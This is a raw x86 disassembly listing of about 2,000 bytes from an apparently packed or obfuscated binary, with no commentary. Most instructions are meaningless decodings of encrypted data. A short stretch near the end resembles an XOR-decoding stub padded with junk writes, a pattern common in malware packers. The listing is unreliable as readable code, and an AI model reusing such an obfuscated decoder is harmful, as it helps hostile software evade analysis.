  404189:	fisub  WORD PTR [ebx+0x79]
  40418c:	lahf   
  40418d:	arpl   WORD PTR [ebp+0x44],si
  404190:	dec    eax
  404191:	cld    
  404192:	xor    DWORD PTR [edx+ecx*4-0x9],ebx
  404196:	adc    edi,DWORD PTR [eax]
  404198:	jp     0x40419e
  40419a:	arpl   WORD PTR ds:0x38323ab1,bp
  4041a0:	mov    al,0xa2
  4041a2:	ja     0x404192
  4041a4:	mov    ecx,DWORD PTR [esi]
  4041a6:	adc    BYTE PTR [ecx-0x2b],ah
  4041a9:	mov    edi,0xe7d1312c
  4041ae:	and    esp,DWORD PTR [ebp-0x5924522f]
  4041b4:	dec    esp
  4041b5:	cmp    ebx,DWORD PTR [edx]
  4041b7:	popf   
  4041b8:	mov    ?,WORD PTR [edi]
  4041ba:	in     al,dx
  4041bb:	jbe    0x404221
  4041bd:	cmp    BYTE PTR [ecx+0x4e],0x1b
  4041c1:	aaa    
  4041c2:	mov    eax,ds:0x3b65c266
  4041c7:	and    ah,bl
  4041c9:	jno    0x404216
  4041cb:	and    DWORD PTR [esp+ebp*8],esp
  4041ce:	retf   
  4041cf:	fdiv   QWORD PTR [ecx+0x36b4aba5]
  4041d5:	mov    ds,WORD PTR [ebx-0x4259a7a]
  4041db:	dec    esi
  4041dc:	js     0x4041ff
  4041de:	cdq    
  4041df:	clc    
  4041e0:	mov    ebx,0x631c3b2c
  4041e5:	and    DWORD PTR [edx+0x776c5531],esi
  4041eb:	jnp    0x4041c6
  4041ed:	and    eax,0x446a33f0
  4041f2:	ret    0x8f9c
  4041f5:	cld    
  4041f6:	dec    esi
  4041f7:	cmp    eax,0x4b63a156
  4041fc:	in     al,dx
  4041fd:	pop    ecx
  4041fe:	cmp    bl,BYTE PTR [ebx+eax*1+0x32]
  404202:	sub    cl,BYTE PTR [eax]
  404204:	(bad)  
  404205:	pop    edx
  404206:	lahf   
  404207:	ja     0x404190
  404209:	jae    0x404209
  40420b:	push   es
  40420c:	xchg   ebp,eax
  40420d:	loop   0x4041c3
  40420f:	cvtps2pd xmm5,QWORD PTR [esi+edi*2-0x3a5be71b]
  404217:	call   0x7ccd:0xd3b028d1
  40421e:	jecxz  0x4041c5
  404220:	inc    ecx
  404221:	ins    DWORD PTR es:[edi],dx
  404222:	inc    ebp
  404223:	pop    edi
  404224:	jmp    0xf5de2c30
  404229:	add    al,0xab
  40422c:	imul   DWORD PTR [esi+0x1674e1e9]
  404232:	fistp  QWORD PTR [ebx-0x4c]
  404235:	adc    al,0x80
  404237:	and    cl,BYTE PTR [esi+0x40f88340]
  40423d:	mov    DWORD PTR ds:0x42fdee,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	(bad)  
  404259:	imul   edx,DWORD PTR [edx*1+0x7070184f],0x3d
  404261:	jge    0x4042d3
  404263:	jo     0x40429a
  404265:	(bad)  
  404266:	fnsave [ebp+eax*8+0xb]
  40426a:	and    DWORD PTR [esi+0x421d0698],edi
  404270:	ja     0x40425b
  404272:	cld    
  404273:	xchg   edx,eax
  404274:	mov    ebp,0xd5eaa846
  404279:	out    dx,eax
  40427a:	xor    eax,ebp
  40427c:	fisttp QWORD PTR [eax]
  40427e:	in     eax,dx
  40427f:	mov    ebx,0x73d98bbc
  404284:	out    0x37,eax
  404286:	or     al,0x6a
  404288:	pop    ecx
  404289:	and    BYTE PTR [esi-0x1e],ah
  40428c:	je     0x404255
  40428e:	arpl   WORD PTR [edx-0x59474a96],dx
  404294:	mov    ebp,DWORD PTR [ebx-0x63c17f12]
  40429a:	(bad)  
  40429b:	std    
  40429c:	lds    edx,FWORD PTR [ebx+ecx*1]
  40429f:	xchg   edx,eax
  4042a0:	mov    dl,0x64
  4042a2:	ret    0x210c
  4042a5:	mov    ebp,0x534d553a
  4042aa:	(bad)  [eax+0x101ab61f]
  4042b0:	or     ecx,edi
  4042b2:	mov    dh,0x26
  4042b4:	test   DWORD PTR [eax+0x4a],ecx
  4042b7:	adc    eax,DWORD PTR [edi-0xb]
  4042ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042bb:	int3   
  4042bc:	out    dx,eax
  4042bd:	test   BYTE PTR [ecx+ebp*8+0xc],dh
  4042c1:	sbb    cl,bh
  4042c3:	push   ebx
  4042c4:	jae    0x4042e9
  4042c6:	pop    ecx
  4042c7:	mov    ah,0xd4
  4042c9:	mov    bh,0xe6
  4042cb:	ret    
  4042cc:	test   esp,0xbb2d35b8
  4042d2:	cmp    dh,BYTE PTR [ebp+0x20]
  4042d5:	mov    dl,0xfa
  4042d7:	sbb    ax,0xaaee
  4042db:	add    ebp,eax
  4042dd:	cld    
  4042de:	loope  0x404293
  4042e0:	inc    ebp
  4042e1:	and    edi,DWORD PTR [edi+0x2ce389d3]
  4042e7:	test   DWORD PTR [ecx+0x691f1610],eax
  4042ed:	retf   
  4042ee:	jecxz  0x40427b
  4042f0:	imul   esi,DWORD PTR [ecx-0x49],0xffffffc6
  4042f4:	mov    ds,WORD PTR [esi+ebp*2+0xb]
  4042f8:	stc    
  4042f9:	hlt    
  4042fa:	or     ecx,DWORD PTR [esi]
  4042fc:	mov    ds:0x4292cb3d,eax
  404301:	out    0x68,al
  404303:	cs sbb eax,0x1975e758
  404309:	dec    eax
  40430a:	mov    esi,0x9ddb6724
  40430f:	mov    ss,esi
  404311:	jmp    0xc861c4ea
  404316:	sub    eax,0x1a4e35ce
  40431b:	push   cs
  40431c:	jg     0x404351
  40431e:	(bad)  
  40431f:	aad    0x2f
  404321:	mov    ecx,0x1f64cd55
  404326:	mov    bl,BYTE PTR [eax+0x17ef1ae1]
  40432c:	es imul edx,edi,0x2c
  404330:	imul   edi,DWORD PTR [esi+0x5c],0x3999982f
  404337:	dec    esi
  404338:	imul   eax,DWORD PTR [ebx],0x7310c762
  40433e:	cdq    
  40433f:	mov    DWORD PTR [ecx+0x47],esp
  404342:	pop    es
  404343:	mov    ebx,0x7c754dba
  404348:	push   ss
  404349:	dec    esp
  40434a:	xchg   al,bl
  40434c:	daa    
  40434d:	xlat   BYTE PTR ds:[ebx]
  40434e:	ret    
  40434f:	mov    ah,0xe3
  404351:	mov    eax,0xd1e10cb8
  404356:	adc    ah,BYTE PTR [eax-0x23]
  404359:	or     BYTE PTR [esi],ah
  40435b:	or     eax,0x78c20cfa
  404360:	sub    DWORD PTR [ecx+0x1d7bb53b],ecx
  404366:	and    ebx,DWORD PTR [ebx-0x7c62194b]
  40436c:	mov    ah,0x5d
  40436f:	xor    DWORD PTR [esp+edx*1],edi
  404372:	xchg   edi,eax
  404373:	cmc    
  404374:	ror    DWORD PTR [ebx],0x64
  404377:	stos   BYTE PTR es:[edi],al
  404378:	daa    
  404379:	repnz hlt 
  40437b:	pop    ebx
  40437c:	aad    0x92
  40437e:	lock cmc 
  404380:	jmp    0x404322
  404382:	xor    eax,0x9fc46ab3
  404387:	lahf   
  404388:	int    0xd
  40438a:	and    al,0xa5
  40438c:	sbb    al,0x56
  40438e:	js     0x40431a
  404390:	int3   
  404391:	cmp    esp,DWORD PTR [bx+si+0x33]
  404395:	daa    
  404396:	ss xor al,0x39
  404399:	shr    BYTE PTR [ecx],0x81
  40439c:	cmc    
  40439d:	and    eax,0x74cea735
  4043a2:	icebp  
  4043a3:	sbb    al,0xbf
  4043a5:	jp     0x40441a
  4043a7:	xor    dh,ch
  4043a9:	fwait
  4043aa:	add    al,0xd5
  4043ac:	fild   DWORD PTR [edi+0x58]
  4043af:	xchg   ebp,eax
  4043b0:	lods   al,BYTE PTR ds:[esi]
  4043b1:	out    dx,al
  4043b2:	xchg   BYTE PTR [ebx],bl
  4043b4:	stc    
  4043b5:	fwait
  4043b6:	pop    ecx
  4043b7:	jb     0x40440c
  4043b9:	push   es
  4043ba:	loop   0x4043bf
  4043bc:	jl     0x404388
  4043be:	call   0x7633:0xb0039665
  4043c5:	(bad)  
  4043c6:	neg    dl
  4043c8:	inc    ebx
  4043c9:	push   esi
  4043ca:	fstp   TBYTE PTR [ebp-0x69dc6f20]
  4043d0:	mov    esi,0xd36d4d1
  4043d5:	sub    al,0xe1
  4043d7:	aas    
  4043d8:	sbb    al,BYTE PTR [esp+eiz*8+0x134baca7]
  4043df:	xchg   DWORD PTR [eax],ebx
  4043e1:	mov    ebp,0xc2ca75e1
  4043e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043e7:	push   es
  4043e8:	loop   0x404378
  4043ea:	cmp    BYTE PTR [edi],bl
  4043ec:	fistp  DWORD PTR [edx+0x11]
  4043ef:	xchg   BYTE PTR [ebx],ah
  4043f1:	cld    
  4043f2:	fisubr WORD PTR ds:0x879c742b
  4043f8:	leave  
  4043f9:	into   
  4043fa:	pushf  
  4043fb:	mov    ecx,0xfdcddb0d
  404400:	into   
  404401:	sub    al,0xc2
  404403:	adc    BYTE PTR ds:0xe970b4ab,0x97
  40440a:	addr16 idiv ah
  40440d:	xor    dh,BYTE PTR [ebx+0x72]
  404410:	mov    edi,0x1587b68d
  404415:	out    0xf7,eax
  404417:	iret   
  404418:	popa   
  404419:	lods   al,BYTE PTR ds:[esi]
  40441a:	push   esp
  40441b:	call   0x9dc38f8d
  404420:	or     al,0x56
  404422:	lods   al,BYTE PTR ds:[esi]
  404423:	stc    
  404424:	dec    eax
  404425:	ins    BYTE PTR es:[edi],dx
  404426:	pop    ebx
  404427:	and    BYTE PTR [esi+0x30ee77ae],al
  40442d:	outs   dx,BYTE PTR ds:[esi]
  40442e:	sbb    al,BYTE PTR [esi-0x49]
  404431:	outs   dx,BYTE PTR ds:[esi]
  404432:	(bad)  
  404433:	sbb    esp,DWORD PTR [edx]
  404435:	mov    dh,0x20
  404437:	sahf   
  404438:	bswap  ecx
  40443a:	or     al,0x2b
  40443c:	mov    al,0x9b
  40443e:	imul   ebx,DWORD PTR [esi+0x3fdc9f12],0x74472c8d
  404448:	ds dec esp
  40444a:	fild   DWORD PTR [edi+0x5d113697]
  404450:	in     al,dx
  404451:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404453:	or     eax,0x35be58e2
  404458:	lock fcomp QWORD PTR [eax]
  40445b:	cwde   
  40445c:	(bad)  
  40445d:	mov    DWORD PTR [edi],esp
  40445f:	outs   dx,DWORD PTR ds:[esi]
  404460:	xchg   esi,eax
  404461:	push   eax
  404462:	dec    esi
  404463:	mov    BYTE PTR [ecx+0x7d],ch
  404466:	call   0xfd46ddd0
  40446b:	mov    ds:0xc2ed4442,eax
  404470:	ja     0x40448d
  404472:	push   esp
  404473:	mov    edx,0xde06eefe
  404478:	jne    0x404451
  40447a:	ins    BYTE PTR es:[edi],dx
  40447b:	sbb    BYTE PTR [eax],0x3e
  40447e:	sub    DWORD PTR [edx-0x56],eax
  404481:	sub    al,0x67
  404483:	in     al,0xff
  404485:	iret   
  404486:	stos   DWORD PTR es:[edi],eax
  404487:	and    ebp,esi
  404489:	xlat   BYTE PTR ds:[ebx]
  40448a:	inc    eax
  40448b:	fcomp  QWORD PTR [edi-0x27]
  40448e:	ins    BYTE PTR es:[edi],dx
  40448f:	mov    eax,ds:0x3ff9cfe9
  404494:	and    cl,ch
  404496:	inc    ebx
  404497:	(bad)  [ebx]
  404499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40449a:	xor    eax,0x4549b366
  40449f:	mov    dh,0x60
  4044a1:	loopne 0x40447c
  4044a3:	fcom   DWORD PTR [ebx-0x14]
  4044a6:	scas   al,BYTE PTR es:[edi]
  4044a7:	or     DWORD PTR [edx+0x3f],0x4c
  4044ab:	test   al,al
  4044ad:	shl    BYTE PTR [ebx-0x4],1
  4044b0:	pop    eax
  4044b1:	dec    ebp
  4044b2:	mov    ecx,0x2f2c8853
  4044b7:	retf   0x5f7f
  4044ba:	xor    DWORD PTR [esi-0x6a62abc2],0x7a
  4044c1:	cmovge edx,esp
  4044c4:	and    eax,0x5a58ed4
  4044c9:	mov    ebp,0x96a4970c
  4044ce:	pop    es
  4044cf:	xor    BYTE PTR [eax-0x42],dl
  4044d2:	(bad)  
  4044d3:	cmp    eax,0xd9e985bb
  4044d8:	stc    
  4044d9:	or     al,BYTE PTR fs:[eax]
  4044dc:	les    edx,FWORD PTR [ebx]
  4044de:	or     al,0xea
  4044e0:	pop    ebp
  4044e1:	push   ss
  4044e2:	icebp  
  4044e3:	jne    0x404543
  4044e5:	inc    eax
  4044e6:	mov    ecx,0xab28602a
  4044eb:	xchg   dl,ch
  4044ed:	and    ah,dl
  4044ef:	pop    ecx
  4044f0:	push   ebp
  4044f1:	ins    DWORD PTR es:[edi],dx
  4044f2:	imul   ecx,DWORD PTR ds:[esi+0x69],0xffffff84
  4044f7:	test   al,0x63
  4044f9:	nop
  4044fa:	(bad)  
  4044fb:	cmp    bh,BYTE PTR [ebx-0x9]
  4044fe:	pop    edx
  4044ff:	jae    0x4044d5
  404501:	(bad)
  404504:	sbb    dh,dl
  404506:	xchg   BYTE PTR [esi+0x5db67456],cl
  40450c:	cmc    
  40450d:	les    edi,FWORD PTR [ebp+eax*1-0x44ca5064]
  404514:	in     eax,0x50
  404516:	mov    dh,0x36
  404518:	rcr    BYTE PTR [eax],0x1a
  40451b:	(bad)  
  40451c:	xchg   edi,eax
  40451d:	(bad)  
  40451e:	shl    DWORD PTR [esi-0x545d82b],1
  404524:	sub    BYTE PTR [edi+0x4dff8c8c],al
  40452a:	sbb    DWORD PTR [ebx-0x28fe5f98],0x29585a3f
  404534:	sub    bl,bl
  404536:	push   ecx
  404537:	cs pushf 
  404539:	push   ss
  40453a:	es xor al,0x93
  40453d:	sar    esi,cl
  40453f:	adc    esi,DWORD PTR [esi]
  404541:	fld    QWORD PTR [edi+0x4f]
  404544:	jp     0x404584
  404546:	cmp    ebx,DWORD PTR [ebp-0x5dac8b2a]
  40454c:	rcl    DWORD PTR [edx-0x21],0x60
  404550:	addr16 call 0xddb:0x5564ca3c
  404558:	jl     0x4044ef
  40455a:	mov    eax,0xc6854b50
  40455f:	mov    bh,bh
  404561:	aam    0xf3
  404563:	xchg   ecx,eax
  404564:	sub    bh,BYTE PTR [edi]
  404566:	mov    dl,0x99
  404569:	push   ecx
  40456a:	jns    0x404568
  40456c:	mov    ds:0xaca2f1bc,eax
  404571:	std    
  404572:	mov    cl,0x60
  404574:	ret    0x9289
  404577:	mov    eax,ds:0xc897f37e
  40457c:	or     esi,0xffffffda
  40457f:	cmp    al,0x33
  404581:	or     esi,0x5af72ef2
  404587:	ror    BYTE PTR [edx+0x39],cl
  40458a:	out    dx,eax
  40458b:	popa   
  40458c:	repz mov eax,ds:0xe54ce379
  404592:	aas    
  404593:	xlat   BYTE PTR ds:[ebx]
  404594:	mov    ecx,0x14a17841
  404599:	adc    al,0x93
  40459b:	retf   
  40459c:	and    eax,0x4066faba
  4045a1:	push   eax
  4045a2:	mov    ch,0x4c
  4045a4:	or     DWORD PTR [ebp+0x1a],0xf
  4045a8:	adc    BYTE PTR [ecx],0xf9
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fe02
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	out    0x91,eax
  4045c9:	(bad)  
  4045ca:	and    ecx,DWORD PTR [esp]
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0xc770707d
  4045d4:	cdq    
  4045d5:	aaa    
  4045d6:	std    
  4045d7:	cmp    dl,BYTE PTR [ebx]
  4045d9:	jnp    0x404603
  4045db:	jl     0x404606
  4045dd:	and    BYTE PTR [esi+edi*1-0x19],al
  4045e1:	ds in  eax,dx
  4045e3:	popa   
  4045e4:	(bad)  
  4045e5:	cmp    BYTE PTR [esi],bh
  4045e7:	and    esp,ecx
  4045e9:	jg     0x404631
  4045eb:	adc    al,BYTE PTR [esi-0x7e4893b1]
  4045f1:	cmp    eax,0xd86af820
  4045f6:	scas   eax,DWORD PTR es:[edi]
  4045f7:	push   cs
  4045f8:	pop    es
  4045f9:	jae    0x4045b5
  4045fb:	pop    ebx
  4045fc:	fstp   TBYTE PTR [edi]
  4045fe:	jmp    0x4045be
  404600:	mov    cl,0xbc
  404602:	or     dl,0xad
  404605:	data16 loopne 0x404640
  404608:	ror    ecx,1
  40460a:	inc    ebp
  40460b:	in     al,0x70
  40460d:	cmc    
  40460e:	leave  
  40460f:	btr    DWORD PTR [ecx],edx
  404612:	and    al,0xbe
  404614:	call   0x894d1e32
  404619:	adc    ah,cl
  40461b:	daa    
  40461c:	imul   al
  40461e:	xchg   esp,eax
  40461f:	sbb    eax,0xc39200f5
  404624:	dec    esp
  404625:	and    BYTE PTR [ebp+0x68],dl
  404628:	rol    BYTE PTR [eax+0x5d918d87],1
  40462e:	fmul   QWORD PTR [ecx]
  404630:	icebp  
  404631:	push   edi
  404632:	scas   al,BYTE PTR es:[edi]
  404633:	(bad)  
  404634:	push   ebp
  404635:	aaa    
  404636:	xchg   ebx,eax
  404637:	and    ebx,DWORD PTR [edx+0x4d]
  40463a:	xchg   edi,eax
  40463b:	lock sbb esp,DWORD PTR [eax-0x7bf2e423]
  404642:	pop    ecx
  404643:	test   edi,ebx
  404645:	add    al,0x14
  404647:	xchg   esp,eax
  404648:	test   eax,0xd04d1a96
  40464d:	add    bh,BYTE PTR [eax]
  40464f:	jge    0x404692
  404651:	xchg   ebp,eax
  404652:	repnz lods al,BYTE PTR ds:[esi]
  404654:	lock push ss
  404656:	test   DWORD PTR [edi],0x44e95085
  40465c:	xor    ch,BYTE PTR [ebx]
  40465e:	jb     0x4046cb
  404660:	js     0x404651
  404662:	cmc    
  404663:	mov    dl,0x83
  404665:	cld    
  404666:	loopne 0x40466b
  404668:	int    0x97
  40466a:	ds mov dl,0xbf
  40466d:	xchg   esi,eax
  40466e:	mov    BYTE PTR [ebp-0x12325718],dl
  404674:	fdivp  st(3),st
  404676:	imul   edi,DWORD PTR [ebp+0x6891b503],0xffffffab
  40467d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40467e:	ret    0x5009
  404681:	neg    BYTE PTR [eax+0x32c55f93]
  404687:	into   
  404688:	cmp    esi,DWORD PTR [edx+0x76]
  40468b:	adc    eax,0x8dd30a62
  404690:	mov    fs,WORD PTR [ebx]
  404692:	ins    BYTE PTR es:[edi],dx
  404693:	xor    al,0xf
  404695:	pop    ebp
  404696:	sbb    esi,DWORD PTR [edi-0x78d75f07]
  40469c:	cdq    
  40469d:	mov    ds:0x9147a6c1,al
  4046a2:	xor    DWORD PTR [ebx-0x6cf62d28],eax
  4046a8:	je     0x404641
  4046aa:	hlt    
  4046ab:	mul    BYTE PTR [ebp+0x2f]
  4046ae:	jo     0x40471a
  4046b0:	sub    ah,al
  4046b2:	or     al,0xb8
  4046b4:	loope  0x40468c
  4046b6:	add    BYTE PTR [eax-0x11f88c02],bh
  4046bc:	push   ds
  4046bd:	fstp   QWORD PTR ds:0xf48561
  4046c3:	loopne 0x404706
  4046c5:	dec    eax
  4046c6:	mov    edx,0x64be4855
  4046cb:	fsubp  st(5),st
  4046cd:	and    ecx,eax
  4046cf:	popf   
  4046d0:	jge    0x4046d0
  4046d2:	or     al,0x67
  4046d4:	push   0x97ef3af4
  4046d9:	dec    edx
  4046da:	hlt    
  4046db:	jb     0x404706
  4046dd:	es push edx
  4046df:	adc    al,0x47
  4046e1:	fwait
  4046e2:	in     al,0xb9
  4046e4:	in     eax,dx
  4046e5:	in     al,dx
  4046e6:	aad    0x6c
  4046e8:	cli    
  4046e9:	xor    eax,edx
  4046eb:	mov    edi,0x96923fbc
  4046f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046f1:	test   eax,0xf5866b53
  4046f6:	xor    DWORD PTR [eax],esi
  4046f8:	pop    es
  4046f9:	mov    edi,0x894c847e
  4046fe:	pop    ds
  4046ff:	mov    dh,0x79
  404701:	push   ds
  404702:	cmp    al,0x1d
  404704:	pop    edi
  404705:	inc    esi
  404706:	sahf   
  404707:	push   ds
  404708:	cmp    eax,0x3ea94fa3
  40470d:	dec    edx
  40470e:	xchg   bh,bl
  404710:	or     dh,dl
  404712:	mov    eax,0x4f8796cf
  404717:	inc    eax
  404718:	sahf   
  404719:	addr16 loopne 0x4046e2
  40471c:	mov    edx,0xd47d6669
  404721:	mov    al,BYTE PTR [ebx]
  404723:	xchg   ebx,ebx
  404725:	pop    edx
  404726:	xchg   esp,eax
  404727:	shl    BYTE PTR [ecx-0x14f4e2ea],cl
  40472d:	jo     0x4046ce
  40472f:	gs xor esi,edi
  404732:	imul   ecx,ebp,0x13
  404735:	call   0x1766a196
  40473a:	mov    BYTE PTR ds:0x72246547,ch
  404740:	mov    ah,0x4b
  404742:	push   eax
  404743:	push   ecx
  404744:	test   eax,0x8b42fa11
  404749:	push   ss
  40474a:	popa   
  40474b:	mov    eax,ds:0xed28a367
  404750:	test   BYTE PTR [eax-0x3f],bl
  404753:	pop    ss
  404754:	in     al,0x3e
  404756:	push   ds
  404757:	add    esi,edx
  404759:	stc    
  40475a:	iret   
  40475b:	push   edx
  40475c:	xchg   esp,eax
  40475d:	xchg   DWORD PTR [ecx+0x755aa444],ecx
  404763:	sbb    eax,0xfa1890aa
  404768:	das    
  404769:	jg     0x4047d3
  40476b:	dec    ebp
  40476c:	sbb    al,BYTE PTR [ebx+0x1ec97516]
  404772:	and    DWORD PTR [ebx+ebp*2+0x2],ebp
  404776:	stc    
  404777:	or     ebx,DWORD PTR [eax]
  404779:	xor    eax,0x8f95372
  40477e:	idiv   BYTE PTR [esi]
  404780:	std    
  404781:	in     eax,0x72
  404783:	pop    ebx
  404784:	inc    cx
  404786:	xor    esp,DWORD PTR [ebp+0x4661498c]
  40478c:	fwait
  40478d:	push   ss
  40478e:	pop    eax
  40478f:	mov    BYTE PTR [esi+0x139035ba],dl
  404795:	lahf   
  404796:	imul   ebx,DWORD PTR [esi],0x16
  404799:	mov    ah,0x1d
  40479b:	sti    
  40479c:	sbb    dl,dl
  40479e:	jl     0x40474c
  4047a0:	scas   al,BYTE PTR es:[edi]
  4047a1:	sbb    bh,BYTE PTR [ecx+0x2b]
  4047a4:	in     al,dx
  4047a5:	mov    eax,0xbcae733e
  4047aa:	retf   0x5423
  4047ad:	in     eax,0x8a
  4047af:	push   ds
  4047b0:	or     ch,BYTE PTR [esi+0x37]
  4047b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047b4:	ins    BYTE PTR es:[edi],dx
  4047b5:	loop   0x404833
  4047b7:	push   esp
  4047b8:	dec    ebp
  4047b9:	nop
  4047ba:	fdivp  st(2),st
  4047bc:	mov    dl,0x9f
  4047be:	mov    bl,0x35
  4047c0:	xchg   esp,eax
  4047c1:	lahf   
  4047c2:	push   0x31
  4047c4:	push   ecx
  4047c5:	or     eax,0x155b84f6
  4047ca:	clc    
  4047cb:	mov    ebp,0x9075bfa
  4047d0:	push   edx
  4047d1:	imul   ecx,eax,0xffffffb0
  4047d4:	mov    al,ds:0x8b04f35b
  4047d9:	cmp    esi,DWORD PTR [ecx-0x6659e736]
  4047df:	add    DWORD PTR [ebx-0xa7679a7],esp
  4047e5:	push   esp
  4047e6:	inc    esi
  4047e7:	jle    0x4047c8
  4047e9:	(bad)  
  4047ea:	xchg   edi,eax
  4047eb:	in     al,dx
  4047ec:	test   al,0x57
  4047ee:	inc    ebp
  4047ef:	es jp  0x404803
  4047f2:	xor    DWORD PTR [ebp-0x37474e88],edx
  4047f8:	mov    ebx,DWORD PTR [ecx+0x3e6d39ce]
  4047fe:	ror    DWORD PTR [eax-0x265ab0c7],cl
  404804:	cmp    DWORD PTR [esi-0x3b32b8a2],edi
  40480a:	jno    0x4047b9
  40480c:	sbb    DWORD PTR [ebx-0x56],eax
  40480f:	ds dec eax
  404811:	dec    eax
  404812:	aaa    
  404813:	adc    al,0xf3
  404815:	dec    edx
  404816:	push   es
  404817:	das    
  404818:	sbb    al,0x2e
  40481a:	stc    
  40481b:	mov    al,ds:0x820c422a
  404820:	pop    edi
  404821:	pop    ds
  404822:	xchg   edi,eax
  404823:	mov    ch,0x55
  404825:	outs   dx,DWORD PTR ds:[esi]
  404826:	pop    es
  404827:	daa    
  404828:	adc    ebp,DWORD PTR [esi-0x65]
  40482b:	mov    dh,0x21
  40482d:	(bad)  
  40482e:	das    
  40482f:	mov    ch,0x2d
  404831:	repnz mov ebx,0x32e42c78
  404837:	cmp    edx,DWORD PTR [edx-0x5d]
  40483a:	ss (bad) 
  40483c:	or     al,0xe7
  40483e:	xor    al,0xff
  404840:	cs add edi,ebx
  404843:	and    eax,0x8399bc76
  404848:	(bad)  
  40484a:	sbb    BYTE PTR [esi+0xdd1755a],al
  404850:	ret    
  404851:	xchg   ebx,eax
  404852:	loope  0x4047f6
  404854:	jecxz  0x4047e8
  404856:	inc    ebp
  404857:	ins    DWORD PTR es:[edi],dx
  404858:	ins    DWORD PTR es:[edi],dx
  404859:	sbb    bh,BYTE PTR [ebx]
  40485b:	icebp  
  40485c:	cs mov dh,0x47
  40485f:	ret    
  404860:	jg     0x40480f
  404862:	mov    esi,0xd7f12881
  404867:	ds pusha 
  404869:	jl     0x404848
  40486b:	mov    ebp,0x84d8d26
  404870:	retf   0x1e97
  404873:	aaa    
  404874:	cs mov ebp,0xfb5f2bff
  40487a:	jmp    0xfaeb649f
  40487f:	mov    ah,0xab
  404881:	out    0x3,eax
  404883:	adc    DWORD PTR [ebx-0x33b16681],esp
  404889:	xor    al,0x41
  40488b:	aam    0xf6
  40488d:	xor    DWORD PTR [ecx+eax*2+0x21],ecx
  404891:	in     al,dx
  404892:	(bad)  
  404893:	test   al,0xac
  404895:	es jecxz 0x4048e5
  404898:	cdq    
  404899:	add    al,0x7c
  40489b:	mov    dh,0xaf
  40489d:	pop    es
  40489e:	lods   al,BYTE PTR ds:[esi]
  40489f:	jne    0x4048bd
  4048a1:	push   es
  4048a2:	xchg   bh,dh
  4048a4:	pusha  
  4048a5:	jae    0x404908
  4048a7:	fcmovne st,st(7)
  4048a9:	retf   0x54e
  4048ac:	mov    esp,0xb1891d7
  4048b1:	imul   ebp,esp,0xffffff88
  4048b4:	dec    ebx
  4048b5:	mov    BYTE PTR [edi+eiz*2],al
  4048b8:	out    dx,eax
  4048b9:	pop    ss
  4048ba:	rcl    BYTE PTR [edx+esi*4-0x649cd5ba],1
  4048c1:	lods   al,BYTE PTR ds:[esi]
  4048c2:	jae    0x4048f8
  4048c4:	jne    0x404879
  4048c6:	repz adc edx,edi
  4048c9:	push   cs
  4048ca:	je     0x404948
  4048cc:	push   es
  4048cd:	mov    WORD PTR [ebx+0x37d5a9c1],?
  4048d3:	xchg   BYTE PTR [esi-0x9],al
  4048d6:	scas   al,BYTE PTR es:[edi]
  4048d7:	cmp    eax,0x1539cd72
  4048dc:	gs pop es
  4048de:	cmp    BYTE PTR [edx-0x78],dl
  4048e1:	adc    ecx,esp
  4048e3:	mov    cl,dh
  4048e5:	outs   dx,BYTE PTR ds:[esi]
  4048e6:	std    
  4048e7:	je     0x40489c
  4048e9:	ror    ah,0x5b
  4048ec:	ins    DWORD PTR es:[edi],dx
  4048ed:	mov    al,ds:0x4192534a
  4048f2:	and    al,0xfa
  4048f4:	jb     0x40488f
  4048f6:	call   0x2ae2c7b8
  4048fb:	jne    0x40492f
  4048fd:	mov    eax,ds:0xfe7a7c1a
  404902:	xor    al,0x71
  404904:	push   0xcccac839
  404909:	mov    bh,0x14
  40490c:	xchg   esp,eax
  40490d:	vmulss xmm4,xmm5,DWORD PTR [ebx]
  404911:	pop    es
  404912:	mov    ds:0x8bf67a66,eax
  404917:	inc    ebp
  404918:	hlt    
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e19c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e1a4,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e77f,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e1b4,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd85,0x42e1b4
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fdfa,0x42fd79
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fdfe,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e783,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fe02,0x42fdfe
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e787,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	in     al,0x42
  4049bd:	push   esp
  4049be:	ja     0x404989
